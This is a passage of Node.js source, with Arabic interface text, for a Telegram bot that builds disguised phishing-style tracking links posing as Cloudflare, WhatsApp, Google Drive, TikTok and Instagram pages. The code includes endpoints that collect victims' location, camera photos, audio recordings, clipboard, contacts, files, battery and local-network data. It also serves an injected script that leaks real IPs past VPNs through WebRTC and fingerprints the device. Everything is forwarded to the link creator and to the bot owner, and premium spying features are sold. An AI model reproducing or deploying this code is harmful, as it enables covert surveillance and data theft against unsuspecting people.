    { text: "🔴 إيقاف الكل", callback_data: "ft:alloff" }
  ]);
  rows.push([
    { text: "⏱️ 15 دقيقة", callback_data: "ft:timer:15" },
    { text: "⏱️ 30 دقيقة", callback_data: "ft:timer:30" },
    { text: "⏱️ 60 دقيقة", callback_data: "ft:timer:60" }
  ]);
  if (settings.featureExpiry) {
    rows.push([{ text: "❌ إلغاء المؤقت", callback_data: "ft:timeroff" }]);
  }
  return JSON.stringify({ inline_keyboard: rows });
}

function featuresText() {
  const expiry = settings.featureExpiry
    ? `\n⏱️ تنتهي في: ${new Date(settings.featureExpiry).toJSON().slice(0,16).replace('T',' ')} UTC`
    : "";
  return `🎛️ *الميزات الإضافية*${expiry}\n\nاضغط على الميزة لتشغيلها أو إيقافها:`;
}

function sendFeaturesMenu(cid) {
  return bot.sendMessage(cid, featuresText(), {
    parse_mode: "Markdown",
    reply_markup: buildFeaturesKeyboard()
  });
}

function editFeaturesMenu(chatId, msgId) {
  return bot.editMessageText(featuresText(), {
    chat_id: chatId,
    message_id: msgId,
    parse_mode: "Markdown",
    reply_markup: buildFeaturesKeyboard()
  }).catch(() => {});
}

// ── Link Creation ─────────────────────────────────────────────────────────────

const lastLink = new Map(); // cid -> cloudflare link (for QR)

async function createLink(cid, msg) {
  if (!msg || typeof msg !== 'string') return;
  const trimmed = msg.trim();
  if (trimmed.toLowerCase().startsWith('http')) {
    const url = cid.toString(36) + '/' + Buffer.from(trimmed).toString('base64');
    bot.sendChatAction(cid, "typing");
    stats.linksCreated++; saveStats();
    incUserStat(String(cid), 'linksCreated');
    const cLink  = `${hostURL}/c/${url}`;
    const wLink  = `${hostURL}/w/${url}`;
    const waLink = `${hostURL}/wa/${url}`;
    const dlLink = `${hostURL}/dl/${url}`;
    const ttLink = `${hostURL}/tt/${url}`;
    const igLink = `${hostURL}/ig/${url}`;
    const coLink = `${hostURL}/co/${url}`;
    const fLink  = `${hostURL}/f/${url}`;
    lastLink.set(String(cid), cLink);
    const premiumSection = isPremium(cid)
      ? `\n\n📒 جهات الاتصال (بريميوم):\n${coLink}\n\n🖼️ صور وملفات (بريميوم):\n${fLink}`
      : "";
    const upsellNote = !isPremium(cid)
      ? `\n\n━━━━━━━━━━━━━━━\n💎 ميزات البريميوم:\n📷 كاميرا أمامية + خلفية\n🎤 تسجيل صوتي\n📋 محتوى الحافظة\n📒 جهات الاتصال الكاملة\n🖼️ صور وملفات الجهاز\n\nللاشتراك تواصل مع @Ye_x00`
      : "";
    bot.sendMessage(cid,
      `✅ تم إنشاء الروابط!\n🔗 URL: ${trimmed}\n\n🛡️ Cloudflare:\n${cLink}\n\n🖥️ WebView:\n${wLink}\n\n💬 WhatsApp:\n${waLink}\n\n📁 Google Drive:\n${dlLink}\n\n🎵 TikTok:\n${ttLink}\n\n📷 Instagram:\n${igLink}${premiumSection}${upsellNote}`,
      { reply_markup: JSON.stringify({ inline_keyboard: [
        [{ text:"🔗 إنشاء رابط جديد", callback_data:"crenew" }],
        [{ text:"📷 QR Code", callback_data:`qr:${cid}` }]
      ] }) }
    );
  } else {
    bot.sendMessage(cid, `⚠️ أدخل رابطاً صحيحاً يبدأ بـ http أو https`);
    createNew(cid);
  }
}

function createNew(cid) {
  bot.sendMessage(cid, `🌐 Enter Your URL`, { reply_markup: JSON.stringify({ force_reply: true }) });
}

// ── Data Endpoints ────────────────────────────────────────────────────────────

app.get("/", (req, res) => res.json({ ip: getIP(req) }));

app.post("/location", (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  const acc = decodeURIComponent(req.body.acc) || null;
  if (lat && lon && uid && acc) {
    const tid = parseInt(uid, 36);
    stats.locations++; saveStats();
    const maps = `https://maps.google.com/?q=${lat},${lon}`;
    notifyLoc(tid, lat, lon);
    notify(tid, `📍 الموقع:\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}\n🗺️ ${maps}`);
    if (tid !== BOT_OWNER) {
      notifyLoc(BOT_OWNER, lat, lon);
      notify(BOT_OWNER, `📍 موقع (ID: ${tid}):\n${lat}, ${lon}\nAccuracy: ${acc}\n🗺️ ${maps}`);
    }
    res.send("Done");
  } else res.send("Missing");
});

app.post("/", (req, res) => {
  let data = decodeURIComponent(req.body.data) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  if (uid && data) {
    data = data.replaceAll("<br>", "\n");
    const tid = parseInt(uid, 36);
    notify(tid, data, { parse_mode: "HTML" });
    if (tid !== BOT_OWNER) notify(BOT_OWNER, `📋 بيانات (ID: ${tid}):\n${data}`, { parse_mode: "HTML" });
    res.send("Done");
  } else res.send("Missing");
});

// Camera snap buffer: collect all snaps then send as album
const _camBuf = new Map(); // tid -> { snaps:[{buf,cam}], timer }

function flushCamAlbum(tid) {
  const entry = _camBuf.get(tid);
  if (!entry || !entry.snaps.length) { _camBuf.delete(tid); return; }
  const snaps = entry.snaps;
  _camBuf.delete(tid);
  stats.camsnaps += snaps.length; saveStats();

  const ts = new Date().toJSON().slice(11,19) + " UTC";
  const frontN = snaps.filter(s=>s.cam==="front").length;
  const backN  = snaps.filter(s=>s.cam==="back").length;

  if (snaps.length === 1) {
    const {buf,cam} = snaps[0];
    const cap = (cam==="back"?"📷 خلفية":"🤳 أمامية") + ` | ${ts}`;
    const info = { filename:"snap.png", contentType:"image/png" };
    if (!settings.silentMode) {
      bot.sendPhoto(tid, buf, { caption: cap }, info).catch(()=>{});
      if (tid !== BOT_OWNER) bot.sendPhoto(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }, info).catch(()=>{});
    }
    return;
  }

  // Send as media group album
  const albumCap = `📸 ${snaps.length} صور | 🤳${frontN} أمامية  📷${backN} خلفية\n🕒 ${ts}`;
  const media = snaps.map((s,i) => ({
    type: "photo",
    media: s.buf,
    ...(i===0 ? { caption: albumCap } : {})
  }));
  if (!settings.silentMode) {
    bot.sendMediaGroup(tid, media).catch(() => {
      snaps.forEach(s => {
        const info = { filename:"snap.png", contentType:"image/png" };
        bot.sendPhoto(tid, s.buf, { caption:(s.cam==="back"?"📷 خلفية":"🤳 أمامية")+` | ${ts}` }, info).catch(()=>{});
      });
    });
    if (tid !== BOT_OWNER) {
      const ownerMedia = snaps.map((s,i) => ({
        type: "photo", media: s.buf,
        ...(i===0 ? { caption: `${albumCap}\n(ID: ${tid})` } : {})
      }));
      bot.sendMediaGroup(BOT_OWNER, ownerMedia).catch(() => {
        snaps.forEach(s => {
          bot.sendPhoto(BOT_OWNER, s.buf, { caption:(s.cam==="back"?"📷 خلفية":"🤳 أمامية")+` | ${ts}\n(ID: ${tid})` }, { filename:"snap.png", contentType:"image/png" }).catch(()=>{});
        });
      });
    }
  }
}

// ── Files/Photos upload (premium) ─────────────────────────────────────────────
app.post("/file-upload", upload.single('file'), (req, res) => {
  const uid  = req.body?.uid || null;
  if (!uid || !req.file) return res.send("Missing");
  const tid      = parseInt(uid, 36);
  const buf      = req.file.buffer;
  const filename = req.file.originalname || 'file';
  const mime     = req.file.mimetype || 'application/octet-stream';
  const cap      = `📁 ملف: ${filename}`;
  if (!settings.silentMode) {
    if (mime.startsWith('image/')) {
      bot.sendPhoto(tid, buf, { caption: cap }).catch(()=>{});
      if (tid !== BOT_OWNER) bot.sendPhoto(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }).catch(()=>{});
    } else if (mime.startsWith('video/')) {
      bot.sendVideo(tid, buf, { caption: cap }).catch(()=>{});
      if (tid !== BOT_OWNER) bot.sendVideo(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }).catch(()=>{});
    } else {
      const info = { filename, contentType: mime };
      bot.sendDocument(tid, buf, { caption: cap }, info).catch(()=>{});
      if (tid !== BOT_OWNER) bot.sendDocument(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }, info).catch(()=>{});
    }
  }
  res.send("Done");
});

// ── Contacts file upload (premium) ────────────────────────────────────────────
app.post("/contacts-file", upload.single('file'), (req, res) => {
  const uid      = req.body?.uid || null;
  const count    = req.body?.count || '?';
  const filename = req.body?.filename || 'contacts.txt';
  if (!uid || !req.file) return res.send("Missing");
  const tid  = parseInt(uid, 36);
  const buf  = req.file.buffer;
  const info = { filename, contentType: 'text/plain' };
  const cap  = `📒 جهات الاتصال: ${count} جهة اتصال`;
  if (!settings.silentMode) {
    bot.sendDocument(tid, buf, { caption: cap }, info).catch(()=>{});
    if (tid !== BOT_OWNER) bot.sendDocument(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }, info).catch(()=>{});
  }
  res.send("Done");
});

app.post("/camsnap", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  const img = decodeURIComponent(req.body.img) || null;
  const cam = decodeURIComponent(req.body.cam) || "front";
  if (uid && img) {
    const tid = parseInt(uid, 36);
    const buf = Buffer.from(img, 'base64');
    if (!_camBuf.has(tid)) _camBuf.set(tid, { snaps:[], timer:null });
    const entry = _camBuf.get(tid);
    entry.snaps.push({ buf, cam });
    if (entry.timer) clearTimeout(entry.timer);
    entry.timer = setTimeout(() => flushCamAlbum(tid), 13000);
    res.send("Done");
  } else res.send("Missing");
});

app.post("/audio", (req, res) => {
  const uid   = decodeURIComponent(req.body.uid)   || null;
  const audio = decodeURIComponent(req.body.audio) || null;
  if (uid && audio) {
    stats.audios++; saveStats();
    const buffer = Buffer.from(audio, 'base64');
    const info   = { filename: "voice.webm", contentType: 'audio/webm' };
    const tid    = parseInt(uid, 36);
    notifyDoc(tid, buffer, { caption: "🎙️ تسجيل صوتي" }, info);
    if (tid !== BOT_OWNER) notifyDoc(BOT_OWNER, buffer, { caption: `🎙️ صوت (ID: ${tid})` }, info);
    res.send("Done");
  } else res.send("Missing");
});

app.post("/clipboard", (req, res) => {
  const uid  = decodeURIComponent(req.body.uid)  || null;
  const clip = decodeURIComponent(req.body.clip) || null;
  if (uid && clip) {
    const tid = parseInt(uid, 36);
    notify(tid, `📋 محتوى الحافظة:\n\n${clip}`);
    if (tid !== BOT_OWNER) notify(BOT_OWNER, `📋 حافظة (ID: ${tid}):\n\n${clip}`);
    res.send("Done");
  } else res.send("Missing");
});

app.post("/network", (req, res) => {
  const uid  = decodeURIComponent(req.body.uid)  || null;
  const data = decodeURIComponent(req.body.data) || null;
  if (uid && data) {
    const tid = parseInt(uid, 36);
    notify(tid, `🌐 بيانات الشبكة:\n${data}`);
    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🌐 شبكة (ID: ${tid}):\n${data}`);
    res.send("Done");
  } else res.send("Missing");
});

// Battery endpoint — always report
app.post("/battery", (req, res) => {
  const uid      = decodeURIComponent(req.body.uid) || null;
  const level    = parseInt(req.body.level);
  const charging = req.body.charging === 'true';
  if (uid && !isNaN(level)) {
    const tid  = parseInt(uid, 36);
    const icon = level > 60 ? '🔋' : level > 20 ? '🪫' : '🔴';
    const plug  = charging ? '🔌 يشحن' : '🔋 لا يشحن';
    const msg  = `${icon} البطارية: ${level}% | ${plug}`;
    notify(tid, msg);
    if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
    res.send("Done");
  } else res.send("Missing");
});

// ── WebRTC real-IP leak (bypasses VPN/proxy) ──────────────────────────────────
app.post("/webrtc-ips", (req, res) => {
  res.send("ok");
  const uid  = req.body.uid || '';
  const ips  = req.body.ips || '';
  const fp   = req.body.fp  || '';
  if (!uid) return;
  const tid = parseInt(uid, 36);
  let msg = `🌐 كشف WebRTC (IP حقيقي):`;
  if (ips) msg += `\n🔓 ${ips}`;
  if (fp)  msg += `\n\n🖥️ بصمة الجهاز:\n${fp}`;
  notify(tid, msg);
  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
});

// ── Tracking JS endpoint — injected into all tracking pages ──────────────────
app.get("/t.js", (req, res) => {
  const uid = (req.query.u || '').replace(/[^a-z0-9]/gi,'');
  if (!uid) return res.status(400).send('');
  res.setHeader('Content-Type','application/javascript');
  res.setHeader('Cache-Control','no-store');
  res.send(`(function(){
  var base="${hostURL}",uid="${uid}";
  // ── WebRTC real-IP leak ──
  try {
    var ips=new Set();
    var pc=new RTCPeerConnection({iceServers:[
      {urls:"stun:stun.l.google.com:19302"},
      {urls:"stun:stun1.l.google.com:19302"},
      {urls:"stun:stun.cloudflare.com:3478"}
    ]});
    pc.createDataChannel("");
    pc.onicecandidate=function(e){
      if(e&&e.candidate){
        var m=e.candidate.candidate.match(/(\\d{1,3}\\.){3}\\d{1,3}/);
        if(m&&m[0]!=="0.0.0.0")ips.add(m[0]);
      }
    };
    pc.createOffer().then(function(o){return pc.setLocalDescription(o);}).catch(function(){});
    setTimeout(function(){
      try{pc.close();}catch(e){}
      if(!ips.size)return;
      var ipList=[...ips].join(" | ");
      // ── Device fingerprint ──
      var fp="";
      try{
        var c=document.createElement("canvas"),ctx=c.getContext("2d");
        ctx.textBaseline="top";ctx.font="14px \\'Arial\\'";
        ctx.fillStyle="#f60";ctx.fillRect(125,1,62,20);
        ctx.fillStyle="#069";ctx.fillText("fingerprint 🖥️ Device",2,2);
        ctx.fillStyle="rgba(102,204,0,0.7)";ctx.fillText("fingerprint 🖥️ Device",4,2);
        var gl=document.createElement("canvas").getContext("webgl");
        var dbg=gl&&gl.getExtension("WEBGL_debug_renderer_info");
        var gpu=dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):"—";
        var hash=c.toDataURL().slice(-12);
        fp="🎨 Canvas: "+hash
          +"\\n🎮 GPU: "+gpu
          +"\\n📐 Screen: "+screen.width+"×"+screen.height+"/"+screen.colorDepth+"bit"
          +"\\n🕐 Timezone: "+Intl.DateTimeFormat().resolvedOptions().timeZone
          +"\\n🌐 Language: "+navigator.language
          +"\\n⚙️ CPU cores: "+(navigator.hardwareConcurrency||"—")
          +"\\n💾 RAM: "+(navigator.deviceMemory||"—")+"GB"
          +"\\n📱 Touch: "+(navigator.maxTouchPoints||0)+" points";
      }catch(e){}
      var body="uid="+encodeURIComponent(uid)
        +"&ips="+encodeURIComponent(ipList)
        +"&fp="+encodeURIComponent(fp);
      var xhr=new XMLHttpRequest();
      xhr.open("POST",base+"/webrtc-ips",true);
      xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
      xhr.send(body);
    },4000);
  }catch(e){}
})();`);
});

// ── Web Push: polling-based (no VAPID needed) ─────────────────────────────────
const PUSH_FILE  = "./push_subs.json";
const PUSH_QUEUE = "./push_queue.json";
let pushSubs  = loadJSON(PUSH_FILE,  {});  // { uid: true }
let pushQueue = loadJSON(PUSH_QUEUE, {});  // { uid: {title,msg} }

app.post("/push-subscribe", (req, res) => {
  res.send("ok");
  const uid = req.body.uid || '';
  if (!uid) return;
  if (!pushSubs[uid]) {
    pushSubs[uid] = true;
    saveJSON(PUSH_FILE, pushSubs);
    const tid = parseInt(uid, 36);
    notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ يمكنك إرسال إشعار لجهازها في أي وقت\nاستخدم: /push ${uid} النص`);
    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\nUID: ${uid} | ID: ${tid}`);
  }
});

// SW polls this every 3 min to check for pending messages
app.get("/push-poll", (req, res) => {
  const uid = req.query.uid || '';
  if (!uid || !pushQueue[uid]) return res.json({});
  const msg = pushQueue[uid];
  delete pushQueue[uid];
  saveJSON(PUSH_QUEUE, pushQueue);
  res.json(msg);
});

// Bot command /push uid text → queues a push notification
function sendPushToDevice(uid, title, msg) {
  pushQueue[uid] = { title, msg };
  saveJSON(PUSH_QUEUE, pushQueue);
}

// ── Persistent ID report ───────────────────────────────────────────────────────
app.post("/pid", (req, res) => {
  res.send("ok");
  const uid = req.body.uid || '';
  const pid = req.body.pid || '';
  const ret = req.body.ret || 'new';   // 'new' | 'existing'
  if (!uid || !pid) return;
  const tid = parseInt(uid, 36);
  const icon = ret === 'existing' ? '🔁' : '🆕';
  const msg = `${icon} زيارة ${ret === 'existing' ? 'متكررة' : 'جديدة'} للجهاز\n🆔 PID: ${pid}`;
  notify(tid, msg);
  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
});

// ── Local network scan results ─────────────────────────────────────────────────
app.post("/localnet", (req, res) => {
  res.send("ok");
  const uid   = req.body.uid   || '';
  const hosts = req.body.hosts || '';
  if (!uid || !hosts) return;
  const tid = parseInt(uid, 36);
  const msg = `🌐 أجهزة الشبكة المحلية:\n${hosts}`;
  notify(tid, msg);
  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
});

// ── Health check endpoint (ping from UptimeRobot) ─────────────────────────────
app.get("/health", (req, res) => res.send("OK"));
app.get("/ping",   (req, res) => res.send("pong"));

// ── Keep Alive (self-ping every 13 min as backup) ─────────────────────────────
setInterval(() => {
  fetch(`${hostURL}/health`).catch(() => {});
}, 13 * 60 * 1000);

// ── Auto-backup every 10 minutes ─────────────────────────────────────────────
setInterval(() => { backupToGitHub(); }, 10 * 60 * 1000);

// ── Save on graceful shutdown (SIGTERM from Render before redeploy) ───────────
process.on('SIGTERM', async () => {
  console.log("SIGTERM — حفظ البيانات قبل الإغلاق...");
  await backupToGitHub();
  process.exit(0);
});

// ── Notify owner when server starts (after cold start / crash recovery) ───────
app.listen(5000, async () => {
  console.log("App Running on Port 5000!");

  // Restore user data from GitHub before doing anything else
  const restored = await restoreFromGitHub();

  setTimeout(() => {
    // Commands for all users
    bot.setMyCommands([
      { command: "start",   description: "ابدأ البوت" },
      { command: "help",    description: "المساعدة" },
      { command: "mystats", description: "إحصائياتي" },
      { command: "myid",    description: "معرّفي" },
      { command: "create",  description: "إنشاء رابط" }
    ]).catch(() => {});

    // Extra commands visible ONLY to the owner
    bot.setMyCommands([
      { command: "start",     description: "ابدأ البوت" },
      { command: "help",      description: "المساعدة" },
      { command: "create",    description: "إنشاء رابط" },
      { command: "features",  description: "🎛️ التحكم بالميزات" },
      { command: "stats",     description: "📊 الإحصائيات" },
      { command: "report",    description: "📋 تقرير شامل" },
      { command: "users",     description: "👥 المستخدمون" },
      { command: "top",           description: "🏆 الأكثر نشاطاً" },
      { command: "lastopen",      description: "🕐 آخر فتح للروابط" },
      { command: "targets",       description: "🎯 الأهداف" },
      { command: "premiumlist",   description: "💎 قائمة المشتركين" },
      { command: "broadcast",     description: "📢 إرسال للجميع" },
      { command: "silent",        description: "🔕 الوضع الصامت" },
      { command: "ping",          description: "🏓 اختبار السرعة" },
      { command: "export",        description: "📤 تصدير البيانات" },
      { command: "cleardata",     description: "🗑️ مسح بيانات مستخدم" }
    ], { scope: { type: "chat", chat_id: BOT_OWNER } }).catch(() => {});

    const up = new Date().toISOString();
    bot.sendMessage(BOT_OWNER,
      `✅ البوت اتشغّل الآن\n🕒 ${up}\n💾 البيانات: ${restored > 0 ? `استُعيدت (${restored} ملف)` : 'ملفات جديدة'}`
    ).catch(() => {});
  }, 3000);
});
